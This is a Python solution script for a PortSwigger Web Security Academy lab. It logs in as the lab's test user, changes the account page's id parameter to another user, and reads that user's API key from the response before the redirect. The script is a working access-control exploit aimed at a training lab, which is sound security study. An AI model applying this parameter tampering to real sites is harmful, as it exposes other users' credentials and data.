# Lab: User ID controlled by request parameter with data leakage in redirect
# https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect

import requests
import re

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# Login with wiener:peter
login_data = {"username": "wiener", "password": "peter"}
response = session.post(f"{base_url}/login", data=login_data)

# visit my account and change the id parameter to carlos to access the API key
response = session.get(f"{base_url}/my-account?id=carlos", allow_redirects=False)

# get the API key through the response before redirection to login
match = re.search(r"Your API Key is: ([A-Za-z0-9]+)", response.text)
if not match:
    print("[-] API key not found in account page")
    exit()

api_key = match.group(1)
print(f"[+] Found API Key: {api_key}")

# submit the API key
submit_url = f"{base_url}/submitSolution"
data = {"answer": api_key}
submit_response = session.post(submit_url, data=data)
print("API Key submitted!")
